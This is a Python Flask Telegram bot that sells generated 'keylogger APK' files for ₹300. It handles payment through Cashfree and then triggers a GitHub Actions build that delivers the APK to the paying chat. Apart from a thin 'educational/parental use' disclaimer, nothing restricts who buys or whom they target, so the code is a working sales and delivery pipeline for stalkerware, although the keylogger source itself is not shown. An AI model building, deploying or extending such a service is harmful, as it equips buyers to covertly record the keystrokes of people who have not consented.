import os
import json
import logging
import hmac
import hashlib
import requests
from flask import Flask, request, render_template

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)
app.logger.setLevel(logging.DEBUG)

# Load environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
REPO_OWNER = os.getenv("REPO_OWNER")
REPO_NAME = os.getenv("REPO_NAME")
GITHUB_PAT = os.getenv("GITHUB_PAT")
CASHFREE_APP_ID = os.getenv("CASHFREE_APP_ID")
CASHFREE_SECRET_KEY = os.getenv("CASHFREE_SECRET_KEY")
PAID_USERS_FILE = "paid_users.json"

if not all([BOT_TOKEN, REPO_OWNER, REPO_NAME, GITHUB_PAT, CASHFREE_APP_ID, CASHFREE_SECRET_KEY]):
    raise ValueError("Missing one or more required environment variables.")

# Paid user logic
def load_paid_users():
    if not os.path.exists(PAID_USERS_FILE):
        return []
    try:
        with open(PAID_USERS_FILE, "r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        app.logger.warning("paid_users.json is corrupted. Resetting.")
        return []

def save_paid_user(chat_id):
    users = load_paid_users()
    chat_id = str(chat_id)
    if chat_id not in users:
        users.append(chat_id)
        with open(PAID_USERS_FILE, "w") as f:
            json.dump(users, f)

def is_user_paid(chat_id):
    return str(chat_id) in load_paid_users()

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html") if os.path.exists("templates/index.html") else "Bot is running."

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_message():
    if not request.is_json:
        return "Expected JSON", 400

    data = request.get_json()
    app.logger.debug(f"Telegram data: {data}")

    message = data.get("message", {})
    chat_id = str(message.get("chat", {}).get("id"))
    command = message.get("text", "").strip()

    if not chat_id or not command:
        return "Invalid data", 400

    if command == "/start":
        welcome = (
            "👋 Welcome to the keylogger APK Generator Bot!\n\n"
            "Developed by <a href=\"https://www.instagram.com/cyber.naveen.info\">cyber.naveen.info</a>\n\n"
            "🛡 Disclaimer: This is for educational/parental use only.\n\n"
            "Use /pay to proceed or /request_apk after payment."
        )
        send_message(chat_id, welcome, "HTML")

    elif command == "/pay":
        payment_link = create_cashfree_order(chat_id)
        if payment_link:
            send_message(chat_id, f"💸 Click here to pay ₹300:\n{payment_link}")
        else:
            send_message(chat_id, "❌ Payment link could not be created. Try again later.")

    elif command == "/request_apk":
        if not is_user_paid(chat_id):
            send_message(chat_id, "🚫 Please pay ₹300 to access this feature. Use /pay to begin.")
            return "OK"
        response = trigger_github_action(chat_id)
        if response and response.status_code == 204:
            send_message(chat_id, "✅ Your APK is being generated. You'll receive it shortly!")
        else:
            app.logger.error(f"GitHub Trigger Failed: {response.text if response else 'No response'}")
            send_message(chat_id, "❌ Error generating APK. Try again later.")

    else:
        send_message(chat_id, "❓ Unknown command. Use /start for help.")

    return "OK"

def trigger_github_action(chat_id):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/build.yml/dispatches"
    payload = {
        "ref": "main",
        "inputs": {"chat_id": str(chat_id)}
    }
    headers = {
        "Authorization": f"Bearer {GITHUB_PAT}",
        "Accept": "application/vnd.github.v3+json"
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response
    except Exception as e:
        app.logger.error(f"GitHub Trigger Exception: {e}")
        return None

def send_message(chat_id, text, parse_mode=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, data=payload)
        app.logger.debug(f"Telegram response: {response.status_code} - {response.text}")
    except Exception as e:
        app.logger.error(f"Telegram Error: {e}")

def create_cashfree_order(chat_id):
    url = "https://sandbox.cashfree.com/pg/orders"
    headers = {
        "x-client-id": CASHFREE_APP_ID,
        "x-client-secret": CASHFREE_SECRET_KEY,
        "x-api-version": "2022-09-01",
        "Content-Type": "application/json"
    }
    order_id = f"kidslogger_{chat_id}_{int(__import__('time').time())}"
    payload = {
        "order_id": order_id,
        "order_amount": 300.0,
        "order_currency": "INR",
        "customer_details": {
            "customer_id": str(chat_id),
            "customer_email": "demo@example.com",
            "customer_phone": "9999999999"
        },
        "order_meta": {
            "notify_url": "https://tellogs.koyeb.app/cashfree-webhook",
            "return_url": "https://tellogs.koyeb.app/paid-success"
        }
    }
    try:
        res = requests.post(url, headers=headers, json=payload)
        app.logger.debug(f"Cashfree Response: {res.status_code} - {res.text}")
        data = res.json()
        return data.get("payments", {}).get("url")
    except Exception as e:
        app.logger.error(f"Cashfree exception: {e}")
        return None

def verify_signature(secret, payload, received_sig):
    expected_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected_sig, received_sig)

@app.route("/cashfree-webhook", methods=["POST"])
def cashfree_webhook():
    raw_payload = request.data
    signature = request.headers.get("x-webhook-signature")

    if not verify_signature(CASHFREE_SECRET_KEY, raw_payload, signature):
        app.logger.warning("Invalid Cashfree webhook signature.")
        return "Invalid signature", 400

    try:
        data = request.get_json()
        app.logger.debug(f"Cashfree webhook data: {json.dumps(data)}")

        if data.get("event") == "PAYMENT_SUCCESS":
            order_data = data.get("data", {}).get("order", {})
            order_id = order_data.get("order_id", "")
            chat_id = order_id.replace("kidslogger_", "").split("_")[0]
            if chat_id:
                save_paid_user(chat_id)
                send_message(chat_id, "✅ Payment confirmed! Now use /request_apk to get your APK.")
            else:
                app.logger.error("Chat ID extraction failed from order_id.")
        else:
            app.logger.info(f"Ignored webhook event: {data.get('event')}")
    except Exception as e:
        app.logger.error(f"Webhook processing error: {e}")

    return "OK", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, use_reloader=False)


